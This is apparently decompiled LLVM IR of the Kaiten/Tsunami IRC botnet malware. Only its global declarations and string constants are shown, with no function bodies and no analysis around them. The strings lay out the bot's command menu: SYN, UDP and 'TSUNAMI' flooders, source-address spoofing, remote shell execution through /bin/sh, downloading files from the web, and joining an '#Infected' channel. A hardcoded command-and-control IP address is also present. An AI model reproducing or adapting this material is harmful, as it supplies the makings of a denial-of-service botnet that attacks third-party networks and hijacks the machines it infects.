source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%3 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r12 = internal unnamed_addr global i32 0
@r16 = internal unnamed_addr global i32 0
@r17 = internal unnamed_addr global i32 0
@r18 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_10030000.11 = global i32 0
@global_var_1002a664.13 = global i32 0
@global_var_1002a684.14 = local_unnamed_addr global i32* @global_var_1002a664.13
@global_var_1002f0d4.17 = global i32 0
@global_var_1002a668.18 = global i32 0
@global_var_10010000.19 = constant [3 x i8] c"8!\00"
@global_var_1002f0ec.20 = global i32 0
@global_var_1002efd8.22 = local_unnamed_addr global i32 0
@global_var_10017a98.23 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_1000053c.24 = constant i32 939524097
@global_var_1002efc8.25 = local_unnamed_addr global i32 0
@global_var_1002efec.26 = local_unnamed_addr global i32 0
@global_var_1002efc4.28 = local_unnamed_addr global i32 0
@global_var_10017ab8.29 = constant [16 x i8] c"/usr/dict/words\00"
@0 = constant i32 1912602624
@global_var_1002efd0.31 = local_unnamed_addr global i32 0
@global_var_10017acc.32 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d78.33 = constant [3 x i8] c"8`\00"
@global_var_10017ae8.34 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f90.35 = constant [3 x i8] c"8`\00"
@global_var_10000f98.36 = constant [3 x i8] c"8`\00"
@global_var_10017b0c.37 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fd8.38 = constant [3 x i8] c"8`\00"
@global_var_10017b34.39 = constant [8 x i8] c"http://\00"
@global_var_1000102c.40 = constant i32 1207959584
@global_var_1000104c.41 = constant i32 939524096
@global_var_10017b3c.42 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001124.43 = constant [3 x i8] c"8`\00"
@global_var_1000112c.44 = constant [3 x i8] c"9?\00"
@global_var_1000115c.45 = constant i32 1207959564
@global_var_10017b64.46 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011b8.47 = constant [3 x i8] c"8`\00"
@global_var_10017b8c.48 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_10017ca0.49 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_10017cbc.50 = constant [3 x i8] c"wb\00"
@global_var_10017cc0.51 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001344.52 = constant i32 1207959588
@global_var_10017cc8.53 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_100014a8.54 = constant i32 1207959588
@global_var_100014fc.55 = constant [3 x i8] c"8`\00"
@global_var_10017ce0.56 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015f4.57 = constant i32 1207959756
@global_var_10017d00.58 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_10017d30.59 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_10017d50.60 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001780.61 = constant i32 1207959652
@global_var_10017d68.62 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_100017bc.63 = constant i32 1207959592
@global_var_10017da0.64 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_10017dac.65 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_10017dc8.66 = constant [9 x i8] c"Disabled\00"
@global_var_10017dd4.67 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_10017df0.68 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_10001890.69 = constant i32 1207959752
@global_var_10017e14.70 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100018c0.71 = constant i32 1207959704
@global_var_10017e34.72 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_100018fc.73 = constant i32 1207959644
@global_var_10033968.74 = global i32 0
@global_var_10017e5c.75 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_10017e7c.76 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001a04.77 = constant i32 1207959708
@global_var_10017e98.78 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001a34.79 = constant i32 1207959660
@global_var_10017eb8.80 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001a78.81 = constant i32 1207959592
@global_var_10017ed4.82 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_10017ef4.83 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_10017f14.84 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001b58.85 = constant i32 1207959952
@global_var_1002efcc.88 = global i32 0
@global_var_10017f64.89 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001d88.90 = constant [3 x i8] c"8`\00"
@global_var_10017f88.91 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10001e80.92 = constant [3 x i8] c"8`\00"
@global_var_10017fb0.93 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_100020f0.94 = constant i32 939524096
@global_var_10017fcc.95 = constant i32 2
@global_var_10002164.96 = constant i32 939524096
@global_var_1001801c.97 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_100021bc.98 = constant [3 x i8] c"8`\00"
@global_var_100021c4.99 = constant [3 x i8] c"8`\00"
@global_var_100021f0.100 = constant i32 939524096
@global_var_10018044.101 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_1000254c.102 = constant [3 x i8] c"9?\00"
@global_var_100025f0.103 = constant i32 939524096
@global_var_1001805c.104 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_10002698.105 = constant [3 x i8] c"8`\00"
@global_var_100026e8.106 = constant [3 x i8] c"8`\00"
@global_var_10002708.107 = constant i32 1208009189
@global_var_10018080.108 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_10002980.109 = constant [3 x i8] c"9?\00"
@global_var_10002a3c.110 = constant [3 x i8] c"8`\00"
@global_var_100180a4.111 = constant [36 x i8] c"NOTICE %s :UNKNOWN <target> <secs>\0A\00"
@global_var_10002ae4.112 = constant [3 x i8] c"8`\00"
@global_var_100180c8.113 = constant [27 x i8] c"NOTICE %s :Unknowning %s.\0A\00"
@global_var_10002b6c.114 = constant i32 1208008065
@global_var_10002c3c.115 = constant [3 x i8] c"8`\00"
@global_var_100180e4.116 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_10002ca4.117 = constant [3 x i8] c"8`\00"
@global_var_1002efe0.118 = local_unnamed_addr global i32 0
@global_var_1002efb8.119 = local_unnamed_addr global i32 0
@global_var_10018100.120 = constant [119 x i8] c"NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls\0A\00"
@global_var_10002d48.121 = constant [3 x i8] c"8`\00"
@global_var_10018178.122 = constant [123 x i8] c"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_10002d68.123 = constant [3 x i8] c"8`\00"
@global_var_100181f4.124 = constant [77 x i8] c"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\0A\00"
@global_var_10002d88.125 = constant [3 x i8] c"8`\00"
@global_var_10018244.126 = constant [93 x i8] c"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\0A\00"
@global_var_10002da8.127 = constant [3 x i8] c"8`\00"
@global_var_100182a4.128 = constant [94 x i8] c"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\0A\00"
@global_var_10002dc8.129 = constant [3 x i8] c"8`\00"
@global_var_10018304.130 = constant [79 x i8] c"NOTICE %s :SERVER <server>                                  = Changes servers\0A\00"
@global_var_10002de8.131 = constant [3 x i8] c"8`\00"
@global_var_10018354.132 = constant [89 x i8] c"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\0A\00"
@global_var_10002e08.133 = constant [3 x i8] c"8`\00"
@global_var_100183b0.134 = constant [92 x i8] c"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\0A\00"
@global_var_10002e28.135 = constant [3 x i8] c"8`\00"
@global_var_1001840c.136 = constant [103 x i8] c"NOTICE %s :DISABLE                                          = Disables all packeting from this client\0A\00"
@global_var_10002e48.137 = constant [3 x i8] c"8`\00"
@global_var_10018474.138 = constant [102 x i8] c"NOTICE %s :ENABLE                                           = Enables all packeting from this client\0A\00"
@global_var_10002e68.139 = constant [3 x i8] c"8`\00"
@global_var_100184dc.140 = constant [80 x i8] c"NOTICE %s :KILL                                             = Kills the client\0A\00"
@global_var_10002e88.141 = constant [3 x i8] c"8`\00"
@global_var_1001852c.142 = constant [117 x i8] c"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_10002ea8.143 = constant [3 x i8] c"8`\00"
@global_var_100185a4.144 = constant [90 x i8] c"NOTICE %s :VERSION                                          = Requests version of client\0A\00"
@global_var_10002ec8.145 = constant [3 x i8] c"8`\00"
@global_var_10018600.146 = constant [91 x i8] c"NOTICE %s :KILLALL                                          = Kills all current packeting\0A\00"
@global_var_10002ee8.147 = constant [3 x i8] c"8`\00"
@global_var_1001865c.148 = constant [77 x i8] c"NOTICE %s :HELP                                             = Displays this\0A\00"
@global_var_100186ac.149 = constant [96 x i8] c"NOTICE %s :IRC <command>                                    = Sends this command to the server\0A\00"
@global_var_10002f20.150 = constant [3 x i8] c"8`\00"
@global_var_1001870c.151 = constant [82 x i8] c"NOTICE %s :SH <command>                                     = Executes a command\0A\00"
@global_var_10002f40.152 = constant [3 x i8] c"8`\00"
@global_var_10002f48.153 = constant [3 x i8] c"8`\00"
@global_var_10018760.154 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_1002efe8.155 = local_unnamed_addr global i32 0
@global_var_10003244.156 = constant i32 939524096
@global_var_1002efd4.157 = local_unnamed_addr global i32 0
@global_var_100187ec.158 = constant [5 x i8] c"IRC \00"
@global_var_10003340.159 = constant i32 1207959588
@global_var_100187f4.160 = constant [4 x i8] c"%s\0A\00"
@global_var_100187f8.161 = constant [4 x i8] c"SH \00"
@global_var_100187fc.162 = constant [60 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_10018838.163 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_10003438.164 = constant [3 x i8] c"8`\00"
@global_var_1000345c.165 = constant [3 x i8] c"8`\00"
@global_var_10018848.166 = constant i32 0
@global_var_1001877c.167 = constant [8 x i8] c"TSUNAMI\00"
@global_var_1002a68c.168 = global [8 x i8]* @global_var_1001877c.167
@global_var_10003744.169 = constant i32 939524097
@global_var_1001884c.170 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_1002efe4.171 = local_unnamed_addr global i32 0
@global_var_1001885c.172 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1001886c.173 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_10018874.174 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_10018880.175 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10003b84.176 = constant i32 1207959720
@global_var_1002ef20.180 = local_unnamed_addr global i32 4
@global_var_10017a88.181 = constant [15 x i8] c"174.138.51.250\00"
@global_var_1002ef24.182 = global [15 x i8]* @global_var_10017a88.181
@global_var_10003f14.183 = constant i32 1207959580
@global_var_10003f6c.184 = constant [3 x i8] c"8`\00"
@global_var_1000402c.185 = constant i32 1207959668
@global_var_10004060.186 = constant [3 x i8] c"8`\00"
@global_var_10018900.187 = constant [6 x i8] c"-bash\00"
@global_var_10004120.188 = constant i32 939524097
@global_var_1002efdc.189 = local_unnamed_addr global i32 0
@global_var_10018908.190 = constant [10 x i8] c"#Infected\00"
@global_var_10018914.191 = constant [5 x i8] c"bleh\00"
@global_var_1001891c.192 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10004264.193 = constant i32 1207959556
@global_var_10018948.194 = constant i32 167772160
@global_var_1000464c.195 = constant i32 1207959568
@global_var_100046f4.196 = constant i32 939524096
@global_var_100188e0.197 = constant [4 x i8] c"352\00"
@global_var_1002a70c.198 = global [4 x i8]* @global_var_100188e0.197
@global_var_1001894c.199 = constant [6 x i8] c"ERROR\00"
@global_var_1002f4ec.200 = global i32 0
@global_var_1002eff0.201 = global i32 0
@global_var_1002eff4.202 = global i32 0
@global_var_1002eff8.203 = global i32 0
@global_var_100048c8.204 = constant i32 1207974477
@global_var_10033b68.205 = global i32 0
@global_var_1003383c.206 = global i32 0
@global_var_100048ec.207 = constant i32 1207982877
@global_var_10004974.208 = constant i32 1207963277
@global_var_10004978.209 = constant i32 1207970217
@global_var_1000497c.210 = constant i32 1207973753
@global_var_1000499c.211 = constant i32 1207974021
@global_var_10004a5c.212 = constant i32 939524096
@global_var_10005124.213 = constant i32 1207982165
@global_var_1002abd8.214 = local_unnamed_addr global [3 x i32] %wide-string
@global_var_1002abdc.215 = local_unnamed_addr global i32 64
@global_var_1002f014.216 = local_unnamed_addr global i32 0
@global_var_1002ef54.217 = local_unnamed_addr global i32 32
@global_var_10005678.218 = constant [3 x i8] c"9 \00"
@global_var_1000570c.219 = constant i32 939524096
@global_var_1002ef34.220 = local_unnamed_addr global i32 -1
@global_var_1002ef30 = external local_unnamed_addr global i32
@global_var_1002a760 = external global i32
@global_var_1002a954.221 = local_unnamed_addr global i32 0
@global_var_100057d8.222 = constant i32 939524096
@global_var_1002f000.223 = local_unnamed_addr global i32 0
@global_var_1002f004.224 = local_unnamed_addr global i32 0
@global_var_1002f01c.225 = local_unnamed_addr global i32 0
@global_var_1002f050.226 = global i32 0
@global_var_1002f04c.227 = global i32 0
@global_var_100058c4.228 = constant [3 x i8] c"8a\00"
@global_var_1002ef58.229 = local_unnamed_addr global i32 33
@global_var_1002ef5c.230 = local_unnamed_addr global i32 34
@global_var_1002effc.231 = local_unnamed_addr global i32 0
@global_var_1002ef98.233 = global i32* bitcast (i16* @global_var_1002ec10.232 to i32*)
@global_var_1002ef9c.234 = local_unnamed_addr global i32 2
@global_var_1002a7a4.235 = local_unnamed_addr global i32* @global_var_1002f04c.227
@global_var_1002a774.236 = local_unnamed_addr global i32 0
@global_var_1002a7ac.237 = local_unnamed_addr global i32* @global_var_1002f050.226
@global_var_100059d0.238 = constant i32 1207978769
@global_var_100059d4.239 = constant i32 1006632992
@global_var_1002f010.240 = local_unnamed_addr global i32 0
@global_var_1002f074.241 = local_unnamed_addr global i32 0
@global_var_10005b50.242 = constant i32 939589631
@global_var_10005b90.243 = constant i32 1207959808
@global_var_1002f018.244 = local_unnamed_addr global i32 0
@global_var_1002a8fc.245 = local_unnamed_addr global i32 0
@global_var_1002f030.246 = local_unnamed_addr global i32 0
@global_var_1002a900.247 = local_unnamed_addr global i32 0
@global_var_1002a940.248 = global i32 0
@global_var_1002abf0.249 = global i32 0
@global_var_1002a95c.250 = local_unnamed_addr global i32* @global_var_1002abf0.249
@global_var_1002aaec.251 = local_unnamed_addr global i32 0
@global_var_1002aae8.252 = local_unnamed_addr global i32 0
@global_var_1002a950.253 = local_unnamed_addr global i32 0
@global_var_1002f038.254 = local_unnamed_addr global i32 0
@global_var_10005c90.255 = constant i32 939589631
@global_var_1002f03c.256 = local_unnamed_addr global i32 0
@global_var_10005cf0.257 = constant i32 939524101
@global_var_1002ac00.258 = global i32 0
@global_var_10005ec4.259 = constant i32 1207959700
@global_var_1002f008.260 = local_unnamed_addr global i32 0
@global_var_1002f00c.261 = local_unnamed_addr global i32 0
@global_var_1002abe0.262 = global i32 0
@global_var_10005ff8.263 = constant [3 x i8] c"8`\00"
@global_var_100060bc.264 = constant [3 x i8] c"8`\00"
@global_var_1000611c.265 = constant [3 x i8] c"8`\00"
@global_var_10006280.266 = constant i32 1006632992
@global_var_10006348.267 = constant [3 x i8] c"8`\00"
@global_var_100063b0.268 = constant [3 x i8] c"9 \00"
@global_var_1000642c.269 = constant [3 x i8] c"8`\00"
@global_var_10006490.270 = constant [3 x i8] c"8`\00"
@global_var_100064c0.271 = constant i32 1207959648
@global_var_1000650c.272 = constant i32 1207959572
@global_var_10006520.273 = constant [3 x i8] c"8`\00"
@global_var_10006598.274 = constant [3 x i8] c"8`\00"
@global_var_10006924.275 = constant i32 939524096
@global_var_10006938.276 = constant i32 1207959592
@global_var_10006a6c.277 = constant i32 1207959756
@global_var_10006b58.278 = constant [3 x i8] c"8`\00"
@global_var_10006b7c.279 = constant [3 x i8] c"8`\00"
@global_var_10006c5c.280 = constant i32 1207959692
@global_var_10006d10.281 = constant [3 x i8] c"8`\00"
@global_var_10006ec8.282 = constant i32 1207969745
@global_var_10006f18.283 = constant i32 939524097
@global_var_10006f9c.284 = constant [3 x i8] c"8`\00"
@global_var_10006fa4.285 = constant [3 x i8] c"8`\00"
@global_var_10007018.286 = constant [3 x i8] c"8`\00"
@global_var_10007034.287 = constant [3 x i8] c"8`\00"
@global_var_1000705c.288 = constant [3 x i8] c"8`\00"
@global_var_10007264.289 = constant [3 x i8] c"8`\00"
@global_var_10007280.290 = constant [3 x i8] c"8`\00"
@global_var_1000729c.291 = constant i32 1207959660
@global_var_1002a958.292 = local_unnamed_addr global i32 0
@global_var_1002f020.293 = local_unnamed_addr global i32 0
@global_var_1002f024.294 = local_unnamed_addr global i32 0
@global_var_10007654.295 = constant i32 939524096
@global_var_1002ef70.296 = local_unnamed_addr global i32 2
@global_var_10007830.298 = constant [3 x i8] c"8`\00"
@global_var_1002a988.299 = global i32 0
@global_var_1002a990.300 = global i32 0
@global_var_1002a98c.301 = local_unnamed_addr global i32 0
@global_var_1002a984.302 = local_unnamed_addr global i32* @global_var_1002a988.299
@global_var_100078e8.303 = constant [3 x i8] c"8`\00"
@global_var_10007908.304 = constant [3 x i8] c":!\00"
@global_var_1000796c.305 = constant i32 1207960936
@global_var_10018954.306 = constant i32 -69500
@global_var_1002f02c.307 = local_unnamed_addr global i32 0
@global_var_1002f028.308 = local_unnamed_addr global i32 0
@global_var_10007c28.309 = constant i32 1207959580
@global_var_10007da4.310 = constant i32 1023414275
@global_var_10007f78.312 = constant [3 x i8] c"9 \00"
@global_var_1002f504.313 = global i32 0
@global_var_1002f51c.314 = global i32 0
@global_var_1002f040.315 = local_unnamed_addr global i32 0
@global_var_100081d4.316 = constant [3 x i8] c"9 \00"
@global_var_10008280.317 = constant i32 1207959676
@global_var_100082b4.318 = constant i32 939524096
@global_var_100082e4.319 = constant [3 x i8] c"8`\00"
@global_var_100082fc.320 = constant [3 x i8] c"8`\00"
@global_var_10008408.321 = constant i32 2080375980
@global_var_10008474.322 = constant i32 939524096
@global_var_100085ec.323 = constant [3 x i8] c"8`\00"
@global_var_10008624.324 = constant i32 939524096
@global_var_10008894.325 = constant i32 939524134
@global_var_100088c0.326 = constant i32 939524134
@global_var_100088ec.327 = constant i32 939524134
@global_var_10008928.328 = constant i32 939524112
@global_var_10008978.329 = constant i32 939524107
@global_var_10008a80.330 = constant i32 1207959792
@global_var_10008c1c.331 = constant i32 1207959912
@global_var_10008de8.332 = constant i32 939524130
@global_var_10008e10.333 = constant i32 1207959704
@global_var_10008e28.334 = constant i32 939524097
@global_var_10008e3c.335 = constant i32 1207959660
@global_var_10008e60.336 = constant i32 939524107
@global_var_1002f528.337 = global i32 0
@global_var_100090e8.338 = constant [3 x i8] c"8`\00"
@global_var_10009310.339 = constant i32 1207959700
@global_var_10009420.340 = constant [3 x i8] c"8`\00"
@global_var_1002f62c.341 = global i32 0
@global_var_100094b0.342 = constant [3 x i8] c"9@\00"
@global_var_1003162c.343 = global i32 0
@global_var_10009514.344 = constant i32 939525121
@global_var_10009548.346 = constant [3 x i8] c"8`\00"
@global_var_10009578.347 = constant [3 x i8] c"8`\00"
@global_var_100095e4.348 = constant [3 x i8] c"8`\00"
@global_var_1000964c.349 = constant [3 x i8] c"8`\00"
@global_var_10009700.350 = constant i32 956301313
@global_var_10009770.351 = constant i32 1207959584
@global_var_10009788.352 = constant i32 939524096
@global_var_10009898.353 = constant i32 1207959572
@global_var_100098ac.354 = constant i32 939524097
@global_var_1002f048.355 = global i32 0
@global_var_1002f044.356 = local_unnamed_addr global i32 0
@global_var_10009b2c.357 = constant i32 2080375980
@global_var_10009bc4.358 = constant i32 1207959732
@global_var_10009c74.359 = constant i32 2080375980
@global_var_10009f2c.360 = constant i32 1207959572
@global_var_1000a01c.361 = constant i32 1207959572
@global_var_1000a114.362 = constant i32 1207959564
@global_var_1000a280.363 = constant i32 1207959812
@global_var_1000a6ac.364 = constant i32 939589631
@global_var_1000ad0c.365 = constant i32 939524118
@global_var_1002ebf8.369 = global i32 0
@global_var_1002f058.370 = local_unnamed_addr global i32 0
@global_var_1000afe0.372 = constant i32 1207966525
@global_var_10031644.373 = global i32 0
@global_var_1002f054.374 = local_unnamed_addr global i32 0
@global_var_1000b1d4.375 = constant i32 939524118
@global_var_1000b2ac.376 = constant i32 939524096
@global_var_1000b2d0.377 = constant [3 x i8] c"9`\00"
@global_var_1000b340.378 = constant i32 1207959864
@global_var_1000b368.380 = constant i32 1207978437
@global_var_10018c6c.381 = constant [8 x i8] c"/bin/sh\00"
@global_var_10018c74.382 = constant [3 x i8] c"sh\00"
@global_var_10018c78.383 = constant [3 x i8] c"-c\00"
@global_var_1000b3f0.384 = constant [3 x i8] c"8`\00"
@global_var_1000b46c.385 = constant i32 1207959580
@global_var_1000b480.386 = constant i32 939524096
@global_var_1000b508.387 = constant i32 1207960120
@global_var_1002ebe0.388 = global i32 0
@global_var_1000b73c.389 = constant i32 1207959560
@global_var_1000b78c.390 = constant [3 x i8] c" c\00"
@global_var_1000b7a8.391 = constant [3 x i8] c" c\00"
@global_var_10018c80.392 = constant i32 0
@global_var_1000ba44.393 = constant i32 1207961092
@global_var_1000bb70.394 = constant i32 1207960768
@global_var_10018cb4.395 = constant i32 269488136
@global_var_10018c98.396 = constant [6 x i8] c"(nil)\00"
@global_var_10018ca0.397 = constant [7 x i8] c"(null)\00"
@global_var_10018ca8.398 = constant i32 721431808
@global_var_1000bfcc.399 = constant i32 939524096
@global_var_10018d34.400 = constant i32 65793
@global_var_10018d1c.401 = constant i32 524293
@global_var_1002efac = external local_unnamed_addr global i32
@global_var_10019cde.403 = constant i32 1
@global_var_10018d14.404 = constant [8 x i8] c" +0-#'I\00"
@global_var_10018cbc.405 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10018cfc.406 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_10018cf0.407 = constant i32 67343
@global_var_10018cef.408 = constant i32 50331911
@global_var_10018ce0.409 = constant i32 268435461
@global_var_10018cd0.410 = constant i32 520093701
@global_var_1000c988.411 = constant [3 x i8] c"8a\00"
@global_var_1000ccf0.412 = constant i32 1207959708
@global_var_1000cd98.413 = constant i32 1207959612
@global_var_1000d008.414 = constant i32 939589631
@global_var_1000d0bc.415 = constant i32 939524118
@global_var_10018d50.416 = constant [8 x i8] c"Success\00"
@global_var_10018d40.417 = constant [15 x i8] c"Unknown error \00"
@global_var_1002efb4.418 = local_unnamed_addr global i32* @global_var_10019cde.403
@global_var_1002f060.419 = global i32 0
@global_var_10033828.420 = global i32 0
@global_var_1003365c.421 = global i32 0
@global_var_1002eef0.422 = global i32 0
@global_var_1002f0a0.423 = local_unnamed_addr global i32 0
@global_var_10033c2c.424 = global i32 0
@global_var_1000dd64.425 = constant [3 x i8] c"8`\00"
@global_var_1000de48.426 = constant i32 939524098
@global_var_1000de88.427 = constant [3 x i8] c"8`\00"
@global_var_1000e224.428 = constant i32 939524118
@global_var_1000e270.429 = constant i32 939524118
@global_var_1000e314.430 = constant i32 939524118
@global_var_1000e36c.431 = constant i32 939524097
@global_var_1002efa0 = external global i32
@global_var_1000e544.434 = constant i32 939524108
@global_var_1000e598.435 = constant i32 939524108
@global_var_1000e64c.436 = constant [3 x i8] c"8`\00"
@global_var_1000e854.437 = constant i32 1207959640
@global_var_1000e890.438 = constant i32 1207959580
@global_var_1002ee08.439 = global i32 0
@global_var_1002ee20 = external global i32
@global_var_1002ee40.441 = global i32 -1726662223
@global_var_1002ee28.442 = local_unnamed_addr global i32* @global_var_1002ee40.441
@global_var_1002ee24.443 = global i32* @global_var_1002ee40.441
@global_var_100198ac.444 = constant i32 0
@global_var_1000eba8.445 = constant i32 939524118
@global_var_1000eefc.446 = constant [3 x i8] c"8`\00"
@global_var_1000f110.447 = constant i32 939524130
@global_var_1002eebc.448 = global i32 0
@global_var_1002f064.449 = local_unnamed_addr global i32 0
@global_var_1000f1a4.450 = constant i32 1207960457
@global_var_1000f1e0.451 = constant i32 939589631
@global_var_1002f070.452 = local_unnamed_addr global i32 0
@global_var_1002f068.453 = global i32 0
@global_var_1002a654.454 = global i32 -1
@global_var_1002f078.455 = local_unnamed_addr global i32 0
@global_var_1002f07c.456 = local_unnamed_addr global i32 0
@global_var_100198d4.457 = constant [10 x i8] c"/dev/null\00"
@global_var_1002f080.458 = local_unnamed_addr global i32 0
@global_var_1002f06c.459 = local_unnamed_addr global i32 0
@global_var_1000f8d8.460 = constant i32 939524096
@global_var_1000f8f4.461 = constant i32 939524096
@global_var_10033854.462 = global i32 0
@global_var_1000f944.463 = constant i32 1207959564
@global_var_1002f088.464 = local_unnamed_addr global i32 0
@global_var_1000f988.465 = constant i32 1207959564
@global_var_1002f084.466 = global i32 0
@global_var_1000f9c4.467 = constant i32 1207959580
@global_var_1000f9d8.468 = constant i32 939524097
@global_var_1000f9f8.469 = constant i32 1207959564
@global_var_1000fa40.470 = constant i32 1207959608
@global_var_1000fa68.471 = constant i32 1207959564
@global_var_1002f090.472 = global i32 0
@global_var_1002f094.473 = global i32 0
@global_var_10033c0c.474 = global i32 0
@global_var_10033b80.475 = global i32 0
@global_var_1000fbd0.476 = constant i32 1207965217
@global_var_1000fc28.477 = constant i32 1207959564
@global_var_1002f0c0.478 = local_unnamed_addr global i32 0
@global_var_10010058.479 = constant i32 939524180
@global_var_100103d8.480 = constant i32 939524105
@global_var_10019f08.481 = constant [4 x i8] c"inf\00"
@global_var_10019f0b.483 = constant i32 4804166
@global_var_10019f18.484 = constant i32 771763200
@global_var_100112c4.485 = constant i32 939589631
@global_var_10011324.486 = constant i32 939589631
@global_var_100113e0.487 = constant i32 939524098
@global_var_10019f68.488 = constant i32 -35328
@global_var_1002ef8c = external local_unnamed_addr global i32
@global_var_10019fa4.489 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_100116d0.490 = constant i32 939524108
@global_var_1002eed4.491 = global i32 268507460
@global_var_100117f0.492 = constant i32 939524108
@global_var_100119b0.493 = constant i32 939524099
@global_var_10033c00.494 = global i32 0
@global_var_10011ea4.495 = constant i32 1207959608
@global_var_10033920.496 = global i32 0
@global_var_1002f08c.497 = local_unnamed_addr global i32 0
@global_var_10033938.498 = global i32 0
@global_var_10011f64.499 = constant i32 939524097
@global_var_100120ac.504 = constant i32 1207959576
@global_var_100120d8.505 = constant i32 939524096
@global_var_10019fd4.506 = constant i32 -32224
@global_var_10019fec.507 = constant i32 0
@global_var_10012964.508 = constant i32 1207959704
@global_var_100129d8.509 = constant i32 1207959588
@global_var_100129f0.510 = constant i32 1207959564
@global_var_10012a2c.511 = constant i32 1207959564
@global_var_10012da4.512 = constant i32 1207959560
@global_var_1001a004.513 = constant i32 268513176
